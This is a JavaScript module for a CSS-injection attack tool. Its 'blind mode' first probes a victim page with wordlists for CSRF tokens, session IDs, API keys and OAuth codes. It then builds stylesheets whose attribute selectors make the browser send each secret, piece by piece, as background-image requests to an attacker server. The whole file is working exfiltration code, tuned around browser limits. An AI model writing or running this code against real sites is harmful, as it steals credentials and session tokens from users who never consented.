// Blind mode: find and extract tokens without knowing the page's selectors.
// Loaded by public/index.html after payload.js, and required by the server and
// tests in Node so all of them use the same rules.
//
// It's two stages because CSS without @import is a single static stylesheet:
//
//   1. Recon. Wordlist probes report which fields exist (CSS can't enumerate
//      attribute names or read values, so names can only be guessed), whether
//      their element renders a usable host for background requests, and
//      whether the value looks like lowercase hex.
//
//        GET /r/i/csrf     an <input name="csrf"> exists (any case)
//        GET /r/if/csrf    ...and it's a direct child of a rendered <form>
//        GET /r/ih/csrf    ...and its value is lowercase hex only
//
//   2. Extract. For each chosen field, the usual frag window rules, but with
//      every URL namespaced by field so the server can tell fields apart
//      (identical URLs from different elements only load once):
//
//        GET /b/0/abcd     field 0's value contains "abcd"
//        GET /b/0/s/ab     field 0's value starts with "ab"
//        GET /b/0/e/ab     field 0's value ends with "ab" (URL params: one
//                          of several candidate ends)
//        GET /b/0/r/ab     (URL params) some param value starts with "ab"
//
// Rules are built as data ({ scope, match, prop, path }) and rendered to CSS
// separately, so tests can evaluate exactly the rules the CSS is made from.
(function (root) {
  const P = typeof module !== 'undefined' && module.exports ? require('./payload') : root;
  const { ANCHOR_LENGTH, MAX_LAYERS_PER_BOX, PSEUDO_BOXES, shortName, allHex } = P;

  // --- wordlists ---------------------------------------------------------------
  // All names match /^[\w-]+$/ so they can go straight into URLs. Matching is
  // ASCII case-insensitive.

  const INPUT_NAMES = [
    'csrf', 'csrf_token', 'csrftoken', 'csrf-token', 'csrfmiddlewaretoken', '_csrf', '_csrf_token',
    'csrf_test_name', 'csrfkey', 'csrf_key', 'csrf_nonce', 'csrf_param', 'csrf_magic', '__csrf_magic',
    '_glpi_csrf_token', 'yii_csrf_token', '_csrf-frontend', '_csrf-backend', 'anticsrf', 'anti_csrf',
    'anticsrftoken', 'xsrf', '_xsrf', 'xsrf_token', 'xsrftoken', 'xsrf-token', '_token', 'token',
    'tokenid', 'token_id', 'token_key', 'authenticity_token', 'auth_token', 'authtoken', 'auth',
    '__requestverificationtoken', 'requestverificationtoken', '__viewstategenerator',
    '__eventvalidation', 'nonce', '_nonce', '_wpnonce', 'wpnonce', 'ajax_nonce', '_ajax_nonce',
    'security', 'securitytoken', 'form_key', 'formkey', 'form_token', 'formtoken', 'form_secret',
    'form_build_id', 'formhash', 'hash_key', 'sesskey', 'ccm_token', 'state', 'session', 'sessionid',
    'session_id', 'sid', 'sessid', 'phpsessid', 'jsessionid', 'access_token', 'accesstoken',
    'refresh_token', 'id_token', 'api_key', 'apikey', 'api_token', 'key', 'secret', 'client_secret',
    'hash', 'hmac', 'signature', 'sig', 'sign', 'code', 'otp', 'verification_code', 'verify',
    'verification_token', 'reset_token', 'resettoken', 'password_reset_token', 'confirm_token',
    'confirmation_token', 'invite_token', 'invitation_token', 'magic_token', 'login_token',
    'logintoken', 'remember_token', 'user_token', 'usertoken', 'uid', 'user_id', 'userid',
    'account_id', 'ticket', 'lt', 'execution', 'request_token', 'requesttoken', 'oauth_token',
    'oauth_state', 'oauth_nonce', 'challenge', 'captcha_token', 'page_token', 'pagetoken',
    'ajax_token', 'ajaxtoken', 'hidden_token',
  ];

  const META_NAMES = [
    'csrf-token', 'csrf-param', 'csrf_token', 'csrftoken', 'csrf', '_csrf', '_csrf_header',
    'x-csrf-token', 'xsrf-token', 'x-xsrf-token', 'token', '_token', 'api-token', 'api-key',
    'api_key', 'apikey', 'nonce', 'csp-nonce', 'request-id', 'session-id', 'user-token',
    'authenticity_token', '__requestverificationtoken', 'wpnonce', 'sesskey', 'ajax-nonce',
    'form-key', 'access-token',
  ];

  const URL_PARAMS = [
    'token', 'code', 'state', 'key', 'sig', 'signature', 'hash', 'hmac', 'nonce', 'csrf',
    'csrf_token', '_token', 'xsrf', 'auth', 'auth_token', 'access_token', 'id_token', 'oauth_token',
    'refresh_token', 'request_token', 'session', 'sessionid', 'sid', 'secret', 'otp', 'ticket',
    'reset', 'reset_token', 'confirm', 'confirmation_token', 'verify', 'verification', 'invite',
    'magic', 'login_token', 'user_token', 'api_key', 'apikey', 'uid', 'tk', 'tok', 't', 'k', 'h',
  ];

  const DATA_ATTRS = [
    'data-csrf', 'data-csrf-token', 'data-csrftoken', 'data-xsrf', 'data-xsrf-token', 'data-token',
    'data-auth-token', 'data-access-token', 'data-api-key', 'data-apikey', 'data-key', 'data-nonce',
    'data-wpnonce', 'data-ajax-nonce', 'data-secret', 'data-session', 'data-session-id', 'data-sid',
    'data-user-token', 'data-hash', 'data-signature', 'data-sig', 'data-form-key', 'data-form-token',
    'data-request-token', 'data-verification-token', 'data-otp', 'data-code', 'data-state',
    'data-security',
  ];

  // Recon kinds, the wordlist each one's names come from, and what a hit means.
  const RECON_KINDS = {
    i: INPUT_NAMES, // input exists
    if: INPUT_NAMES, // ...and its form renders (it's the extraction host)
    ih: INPUT_NAMES, // ...and its value is lowercase hex
    m: META_NAMES, // meta exists (and renders, which always works)
    mh: META_NAMES, // ...and its content is lowercase hex
    a: URL_PARAMS, // a link has ?name= or &name=
    f: URL_PARAMS, // a form action has ?name= or &name=
    d: DATA_ATTRS, // an element has the data attribute
    ds: DATA_ATTRS, // ...and that element renders (it's the extraction host)
    dh: DATA_ATTRS, // ...and its value is lowercase hex
    iu: ['x'], // a hidden input whose name isn't in INPUT_NAMES exists
  };

  // The extractable field kinds (the `kind` on a discovered field), each with
  // its wordlist, the hosts fieldsFromRecon/assignHosts can assign it, and
  // whether the whole attribute is the value. Single source of truth: the
  // server validates incoming fields against this.
  const FIELD_KINDS = {
    input: { names: INPUT_NAMES, hosts: ['form', 'html'], whole: true },
    meta: { names: META_NAMES, hosts: ['self'], whole: true },
    data: { names: DATA_ATTRS, hosts: ['self', 'html'], whole: true },
    a: { names: URL_PARAMS, hosts: ['self'], whole: false },
    form: { names: URL_PARAMS, hosts: ['self'], whole: false },
  };

  // A value is lowercase hex if it's non-empty and contains none of these.
  // `i` makes g-z cover G-Z too; A-F need their own case-sensitive tests.
  const NON_HEX = [
    ...[...'ghijklmnopqrstuvwxyz'].map(c => [c, true]),
    ...[...'ABCDEF'].map(c => [c, false]),
    ...[...'-_.,/+=:;~%!@#$&*()[]{}| '].map(c => [c, false]),
  ];

  // --- matches and rules -------------------------------------------------------

  // A match tests one element:
  //   { tag, attrs: [test], is: [test], not: [test] }
  // where test = [name] (present) or [name, op, value, caseInsensitive].
  // `is` passes if any of its tests pass, `not` fails if any of its tests pass.

  const cssString = s => '"' + s.replace(/["\\]/g, '\\$&') + '"';

  function renderTest([name, op, value, ci]) {
    if (!op) return `[${name}]`;
    return `[${name}${op}${cssString(value)}${ci ? ' i' : ''}]`;
  }

  // `wrap` moves every attribute test inside :is(), leaving only the tag at
  // the top level. Chrome takes ~7 s to build a stylesheet with tens of
  // thousands of top-level attribute selectors (even ones that never match),
  // but the same tests inside :is() cost ~0.1 s. Inside :has() they're
  // already cheap.
  function renderMatch(m, wrap = false) {
    const tag = m.tag || '';
    let tests = '';
    for (const t of m.attrs || []) tests += renderTest(t);
    const list = m.is && m.is.length ? m.is.map(renderTest).join(',') : '';
    const not = m.not && m.not.length ? `:not(${m.not.map(renderTest).join(',')})` : '';
    if (wrap && list && !tests && !not) return `${tag}:is(${list})`;
    const inner = tests + (list ? `:is(${list})` : '') + not;
    if (wrap && inner) return `${tag}:is(${inner})`;
    return tag + inner || '*';
  }

  // The element a rule's custom property lands on:
  //   self  the matched element itself
  //   form  the <form> the matched element is a direct child of
  //   html  the root element, if the match exists anywhere
  function subjectSelector(scope, match) {
    if (scope === 'self') return renderMatch(match, true);
    if (scope === 'form') return `form:has(>${renderMatch(match)})`;
    return `html:has(${renderMatch(match)})`;
  }

  const hostSelector = host => (host.scope === 'html' ? 'html' : subjectSelector(host.scope, host.match));

  // Chrome silently ignores a whole stylesheet with more than 2^18 rules
  // (262,144: a single 4-char field is ~66k), so big payloads are split over
  // several <style> elements.
  const MAX_RULES_PER_SHEET = 250000;

  // Every rule sets its own custom property to a url() and every host lists
  // its properties in one `background`, so each matching rule is one request.
  // Hosts are split over the element and its ::before/::after because Chrome
  // crashes with too many layers on one box.
  function render(payload, server) {
    const css = [];
    if (payload.displayMeta) css.push('head,meta{display:block}');
    for (const r of payload.rules) {
      if (css.length && css.length % MAX_RULES_PER_SHEET === 0) css.push('</style><style>');
      css.push(`${subjectSelector(r.scope, r.match)}{--${r.prop}:url(${server}/${r.path})}`);
    }
    const hosts = new Map();
    for (const h of payload.hosts) {
      const sel = hostSelector(h);
      if (!hosts.has(sel)) hosts.set(sel, []);
      const props = hosts.get(sel);
      for (const p of h.props) props.push(p); // too many to spread
    }
    for (const [sel, props] of hosts) {
      const layers = props.map(p => `var(--${p},none)`);
      const boxCount = Math.ceil(layers.length / MAX_LAYERS_PER_BOX);
      if (boxCount > 1 + PSEUDO_BOXES.length) throw new Error(`too many layers for ${sel}`);
      const perBox = Math.ceil(layers.length / boxCount);
      for (let i = 0; i < boxCount; i++) {
        const background = `background:${layers.slice(i * perBox, (i + 1) * perBox).join(',')}`;
        if (i === 0) css.push(`${sel}{${background}}`);
        else css.push(`${sel}${PSEUDO_BOXES[i - 1]}{content:"";display:inline-block;${background}}`);
      }
    }
    return `<style>${css.join('')}</style>`;
  }

  const hexOnly = attr => ({
    attrs: [[attr]],
    not: [[attr, '=', ''], ...NON_HEX.map(([c, ci]) => [attr, '*=', c, ci])],
  });
  const withTests = (m, extra) => ({
    tag: m.tag,
    attrs: [...(m.attrs || []), ...(extra.attrs || [])],
    is: m.is,
    not: [...(m.not || []), ...(extra.not || [])],
  });

  const inputMatch = name => ({ tag: 'input', attrs: [['name', '=', name, true]] });
  const metaMatch = name => ({ tag: 'meta', attrs: [['name', '=', name, true], ['content']] });
  const paramMatch = (tag, attr, name) => ({
    tag,
    is: [[attr, '*=', `?${name}=`, true], [attr, '*=', `&${name}=`, true]],
  });
  const dataMatch = name => ({ attrs: [[name]] });

  // --- stage 1: recon ----------------------------------------------------------

  const TARGETS = ['input', 'meta', 'url', 'data'];

  function reconPayload(cfg = {}) {
    const targets = new Set(cfg.targets || TARGETS);
    const rules = [];
    const hostProps = { html: [], form: [], meta: [], a: [], data: [] };
    let n = 0;
    const probe = (host, scope, match, kind, name) => {
      const prop = 'r' + shortName(n++);
      rules.push({ scope, match, prop, path: `r/${kind}/${name}` });
      hostProps[host].push(prop);
    };

    if (targets.has('input')) {
      INPUT_NAMES.forEach(w => {
        probe('html', 'html', inputMatch(w), 'i', w);
        probe('form', 'form', inputMatch(w), 'if', w);
        probe('html', 'html', withTests(inputMatch(w), hexOnly('value')), 'ih', w);
      });
      probe('html', 'html', {
        tag: 'input',
        attrs: [['type', '=', 'hidden', true]],
        not: INPUT_NAMES.map(w => ['name', '=', w, true]),
      }, 'iu', 'x');
    }
    if (targets.has('meta')) {
      META_NAMES.forEach(w => {
        probe('meta', 'self', metaMatch(w), 'm', w);
        probe('meta', 'self', withTests(metaMatch(w), hexOnly('content')), 'mh', w);
      });
    }
    if (targets.has('url')) {
      URL_PARAMS.forEach(w => {
        probe('a', 'self', paramMatch('a', 'href', w), 'a', w);
        probe('form', 'self', paramMatch('form', 'action', w), 'f', w);
      });
    }
    if (targets.has('data')) {
      DATA_ATTRS.forEach(w => {
        probe('html', 'html', dataMatch(w), 'd', w);
        probe('data', 'self', dataMatch(w), 'ds', w);
        probe('html', 'html', withTests(dataMatch(w), hexOnly(w)), 'dh', w);
      });
    }

    // A form is one host for both its child inputs and its own action, since
    // a second `background` on the same element would replace the first.
    const hosts = [
      { scope: 'html', props: hostProps.html },
      { scope: 'self', match: { tag: 'form' }, props: hostProps.form },
      { scope: 'self', match: { tag: 'meta', attrs: [['name']] }, props: hostProps.meta },
      { scope: 'self', match: { tag: 'a', attrs: [['href', '*=', '=']] }, props: hostProps.a },
      { scope: 'self', match: { is: DATA_ATTRS.map(w => [w]) }, props: hostProps.data },
    ].filter(h => h.props.length);
    return { rules, hosts, displayMeta: hostProps.meta.length > 0 };
  }

  const generateReconCSS = (cfg, server) => render(reconPayload(cfg), server);

  // Turns the set of recon hits ("kind/name") into extractable fields.
  function fieldsFromRecon(hits) {
    const has = (kind, name) => hits.has(`${kind}/${name}`);
    const fields = [];
    for (const w of INPUT_NAMES) {
      if (has('i', w)) fields.push({ kind: 'input', name: w, host: has('if', w) ? 'form' : 'html', hex: has('ih', w) });
    }
    for (const w of META_NAMES) {
      if (has('m', w)) fields.push({ kind: 'meta', name: w, host: 'self', hex: has('mh', w) });
    }
    for (const w of URL_PARAMS) {
      if (has('a', w)) fields.push({ kind: 'a', name: w, host: 'self', hex: null });
      if (has('f', w)) fields.push({ kind: 'form', name: w, host: 'self', hex: null });
    }
    for (const w of DATA_ATTRS) {
      if (has('d', w)) fields.push({ kind: 'data', name: w, host: has('ds', w) ? 'self' : 'html', hex: has('dh', w) });
    }
    return { fields, unlistedInputs: has('iu', 'x') };
  }

  // --- stage 2: extract --------------------------------------------------------

  // How each kind of field is matched, which attribute holds the value, and
  // whether the whole attribute is the value (else it's a URL parameter).
  function fieldTarget(field) {
    const kind = FIELD_KINDS[field.kind];
    if (!kind) throw new Error('unknown field kind ' + field.kind);
    const whole = kind.whole;
    switch (field.kind) {
      case 'input': return { match: inputMatch(field.name), attr: 'value', whole };
      case 'meta': return { match: metaMatch(field.name), attr: 'content', whole };
      case 'data': return { match: dataMatch(field.name), attr: field.name, whole };
      // The window rules only need a cheap "has name=" test (the start rules
      // pin down ?name= / &name= themselves), which saves ~50 bytes a rule.
      case 'a': return { match: { tag: 'a', attrs: [['href', '*=', field.name + '=', true]] }, attr: 'href', whole };
      case 'form': return { match: { tag: 'form', attrs: [['action', '*=', field.name + '=', true]] }, attr: 'action', whole };
      default: throw new Error('unknown field kind ' + field.kind);
    }
  }

  // Each kind of host is one element (plus its ::before/::after), so it can
  // only carry so many layers: one 4-char field, or ~16 3-char fields.
  const HOST_CAPACITY = MAX_LAYERS_PER_BOX * (1 + PSEUDO_BOXES.length);
  const WHOLE_KINDS = new Set(['input', 'meta', 'data']);
  // Hosts each kind can fall back to when its preferred one is full: any
  // input or data attribute can be reached with html:has().
  const FALLBACK_HOSTS = { input: ['form', 'html'], data: ['self', 'html'] };

  function layersFor(field) {
    const k = Number(field.windowSize) === 3 ? 3 : 4;
    const anchors = 16 ** ANCHOR_LENGTH;
    // start + windows + end, and for URL params the per-value "&" ends, the
    // "#" end and the run starts.
    return 16 ** k + 2 + (WHOLE_KINDS.has(field.kind) ? 0 : 2 * anchors + 1);
  }

  function hostKey(field) {
    if (field.host === 'html') return 'html';
    if (field.host === 'form' || field.kind === 'form') return 'form';
    return field.kind;
  }

  // Give each field a host with room for its layers, starting from the one
  // recon found and falling back where possible (a form that doesn't render
  // can't be used, so an input recon put on html stays there).
  function assignHosts(fields) {
    const used = new Map();
    const out = [];
    for (const field of fields) {
      const order = FALLBACK_HOSTS[field.kind] || [field.host];
      const options = order.slice(Math.max(0, order.indexOf(field.host)));
      const need = layersFor(field);
      const host = options.find(h => (used.get(hostKey({ ...field, host: h })) || 0) + need <= HOST_CAPACITY);
      if (!host) {
        return {
          error: `no room for ${field.name}: each kind of element can carry one 4-char field ` +
            '(or ~16 3-char ones). Use 3-char windows or extract it in a separate pass.',
        };
      }
      const key = hostKey({ ...field, host });
      used.set(key, (used.get(key) || 0) + need);
      out.push({ ...field, host });
    }
    return { fields: out };
  }

  // Each field: { id, kind, name, host, windowSize }. Field ids namespace the
  // URLs; the props share one counter so fields never clash.
  //
  // Hosts are shared per kind of element, not per field: two fields in the
  // same form (or two params on the same link) would otherwise each set a
  // `background` on one element and the later would wipe out the earlier.
  // Props a field doesn't set on an element fall back to `none`.
  function extractPayload(fields) {
    const rules = [];
    const shared = new Map();
    const dataNames = [];
    let n = 0;
    let displayMeta = false;
    for (const field of fields) {
      const { match, attr, whole } = fieldTarget(field);
      const k = Number(field.windowSize) === 3 ? 3 : 4;
      const scope = field.host === 'form' || field.host === 'html' ? field.host : 'self';
      const id = field.id;
      const key = hostKey(field);
      if (key === 'data') dataNames.push(field.name);
      if (!shared.has(key)) shared.set(key, new Set());
      const props = shared.get(key);
      const rule = (test, prop, path) => {
        rules.push({ scope, match: withTests(match, { attrs: [test] }), prop, path: `b/${id}/${path}` });
        props.add(prop);
      };

      for (const a of allHex(ANCHOR_LENGTH)) {
        if (whole) rule([attr, '^=', a], `s${id}-`, 's/' + a);
        else {
          for (const sep of '?&') {
            rules.push({
              scope,
              match: { tag: match.tag, attrs: [[attr, '*=', `${sep}${field.name}=${a}`, true]] },
              prop: `s${id}-`,
              path: `b/${id}/s/${a}`,
            });
          }
          props.add(`s${id}-`);
        }
      }
      for (const w of allHex(k)) rule([attr, '*=', w], 'b' + shortName(n++), w);
      for (const a of allHex(ANCHOR_LENGTH)) {
        rule([attr, '$=', a], `e${id}-`, 'e/' + a);
        // A URL param usually ends at the next "&" (or "#"), but other params
        // end there too, so each candidate end gets its own property and they
        // all reach the server rather than only the last matching rule.
        if (!whole) {
          rule([attr, '*=', a + '&'], `e${id}-${a}`, 'e/' + a);
          rule([attr, '*=', a + '#'], `f${id}-`, 'e/' + a);
          // Where every param value starts, so the solver can tell whole junk
          // params from a token spliced into one.
          rule([attr, '*=', '=' + a], `r${id}-${a}`, 'r/' + a);
        }
      }
      if (field.kind === 'meta') displayMeta = true;
    }

    const HOSTS = {
      html: { scope: 'html' },
      form: { scope: 'self', match: { tag: 'form' } },
      a: { scope: 'self', match: { tag: 'a' } },
      meta: { scope: 'self', match: { tag: 'meta' } },
      data: { scope: 'self', match: { is: [...new Set(dataNames)].map(w => [w]) } },
    };
    const hosts = [...shared].map(([key, props]) => ({ ...HOSTS[key], props: [...props] }));
    return { rules, hosts, displayMeta };
  }

  const generateBlindCSS = (fields, server) => render(extractPayload(fields), server);

  const api = {
    INPUT_NAMES, META_NAMES, URL_PARAMS, DATA_ATTRS, RECON_KINDS, FIELD_KINDS, TARGETS,
    renderMatch, render, reconPayload, generateReconCSS, fieldsFromRecon,
    fieldTarget, assignHosts, extractPayload, generateBlindCSS,
  };
  if (typeof module !== 'undefined' && module.exports) module.exports = api;
  else root.FragBlind = api;
})(typeof window !== 'undefined' ? window : globalThis);
